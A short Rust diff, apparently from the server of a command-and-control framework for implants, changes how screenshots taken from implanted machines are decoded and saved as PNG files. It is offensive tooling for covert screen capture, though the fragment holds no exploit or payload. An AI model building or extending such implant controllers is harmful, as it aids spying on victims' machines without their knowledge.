@@ -3,6 +3,7 @@ use arrayvec::ArrayVec;
 use base64;
 use chrono;
 use diesel::prelude::*;
+use repng;
 use std::fs::File;
 use std::io::Write;
 use std::str::FromStr;
@@ -13,6 +14,7 @@ use crate::db::connect::Pool;
 use crate::errors::ServerError;
 use crate::models::implant::{Implant, SystemInfo};
 use crate::models::plain_result::PlainResult;
+use crate::models::screenshot::ScreenshotResponse;
 use crate::models::task::{Task, Tasks};
 use crate::utils::{network_encryption, shell};
 
@@ -70,7 +72,7 @@ pub async fn post_task(
         public_key,
     )?;
 
-    // Get task from db
+    //& Get task from db
     let db_clone = db.clone();
     let task_id_clone = task_id.clone();
     let task = web::block(move || get_task_from_db(db_clone, task_id_clone)).await??;
@@ -101,21 +103,22 @@ pub async fn post_task(
                 .await??;
         }
         Tasks::TakeScreenshot => {
-            let deserialized_response: Vec<u8> = bincode::deserialize(&decrypted_response[..])?;
+            let deserialized_response: ScreenshotResponse =
+                bincode::deserialize(&decrypted_response[..])?;
 
-            // Save bytes as task_id.yuv
-            let mut file = File::create(format!("assets/{}.yuv", task.task_id.to_string()))?;
-            file.write_all(&deserialized_response)?;
-
-            // Save image as png
-            shell::execute_command(format!("ffmpeg -s 640x480 -pix_fmt yuyv422 -i assets/{}.yuv -f image2 -pix_fmt rgb24 assets/{}.png", task.task_id.to_string(), task.task_id.to_string()))?;
+            repng::encode(
+                File::create(format!("assets/{}.png", task.task_id.to_string()))?,
+                deserialized_response.width,
+                deserialized_response.height,
+                &deserialized_response.bitflipped_bytes,
+            )?;
 
             // Save in plain_results table
             web::block(move || {
                 add_plain_result(
                     db,
                     task.task_id,
-                    deserialized_response,
+                    deserialized_response.bitflipped_bytes,
                     Some(format!("{}.png", task.task_id.to_string())),
                 )
             })
